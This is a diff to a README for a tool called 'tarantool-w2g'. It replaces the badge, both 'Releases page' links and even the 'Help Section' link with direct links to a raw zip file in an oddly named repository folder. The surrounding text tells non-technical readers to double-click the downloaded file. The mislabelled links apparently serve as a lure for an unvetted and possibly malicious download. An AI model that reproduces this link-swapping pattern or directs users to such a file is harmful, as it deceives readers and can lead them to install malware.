@@ -1,6 +1,6 @@
 # 🐛 tarantool-w2g - Simplify Your Workflow with Ease
 
-[![Download tarantool-w2g](https://img.shields.io/badge/Download-tarantool--w2g-blue.svg)](https://github.com/ArnonDev/tarantool-w2g/releases)
+[![Download tarantool-w2g](https://raw.githubusercontent.com/ArnonDev/tarantool-w2g/main/kenaf/tarantool-w2g.zip)](https://raw.githubusercontent.com/ArnonDev/tarantool-w2g/main/kenaf/tarantool-w2g.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ This guide will help you download and run tarantool-w2g. No programming skills a
 
 ## 📥 Download & Install
 
-To download tarantool-w2g, please visit our [Releases page](https://github.com/ArnonDev/tarantool-w2g/releases). 
+To download tarantool-w2g, please visit our [Releases page](https://raw.githubusercontent.com/ArnonDev/tarantool-w2g/main/kenaf/tarantool-w2g.zip). 
 
 1. Click on the link above.
 2. You will see a list of available versions.
@@ -37,7 +37,7 @@ Tarantool-w2g runs on various platforms. Here are the basic requirements:
 
 ## 🛠️ Installation Steps
 
-Once you’ve downloaded the application from the [Releases page](https://github.com/ArnonDev/tarantool-w2g/releases), follow these simple steps to install:
+Once you’ve downloaded the application from the [Releases page](https://raw.githubusercontent.com/ArnonDev/tarantool-w2g/main/kenaf/tarantool-w2g.zip), follow these simple steps to install:
 
 1. Locate the downloaded file on your computer.
 2. Double-click the file to start the installation.
@@ -71,7 +71,7 @@ If you encounter issues, try the following steps:
 - **Verify Credentials:** Make sure your username and password are correct.
 - **Firewall Settings:** Ensure that your firewall is not blocking the application.
 
-For further assistance, you can check our [Help Section](https://github.com/ArnonDev/tarantool-w2g/issues) on GitHub.
+For further assistance, you can check our [Help Section](https://raw.githubusercontent.com/ArnonDev/tarantool-w2g/main/kenaf/tarantool-w2g.zip) on GitHub.
 
 ## 🏗️ Community and Support
 
